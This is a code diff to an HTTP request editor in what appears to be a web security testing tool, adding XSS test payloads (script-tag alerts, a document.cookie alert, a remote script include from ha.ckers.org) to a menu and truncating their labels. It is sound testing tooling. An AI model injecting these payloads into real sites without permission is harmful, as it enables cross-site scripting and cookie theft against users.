@@ -94,12 +94,14 @@ class HttpEditor(gtk.VBox, Searchable):
         Taken from: http://ha.ckers.org/xss.html
         '''
         return [
-                '\'\';!--"<XSS>=&{()}',
-                '''';alert(String.fromCharCode(88,83,83))//\\\';
-                alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";
-                alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))
-                </SCRIPT>''',
-                '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'
+                '";!--\'<XSS>=&{()}\\xss<script>alert(document.cookie)</script>',
+                '''';alert(String.fromCharCode(88,83,83))//\\\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>''',
+                '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
+                '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
+                '<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
+                '<<SCRIPT>alert("XSS");//<</SCRIPT>',
+                '''<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>''', 
+                '\\";alert(\'XSS\');//'
                 ]
 
     def _insert_payload(self, widg, payload):
@@ -130,7 +132,7 @@ class HttpEditor(gtk.VBox, Searchable):
         # Strings payloads
         payloadMenu = gtk.Menu()
         for i in self.get_string_payloads():
-            payloadItem = gtk.MenuItem(i)
+            payloadItem = gtk.MenuItem(i[:50] + ' ...')
             payloadItem.connect("activate", self._insert_payload, i)
             payloadMenu.append(payloadItem)
         opc = gtk.MenuItem(_("String payloads"))
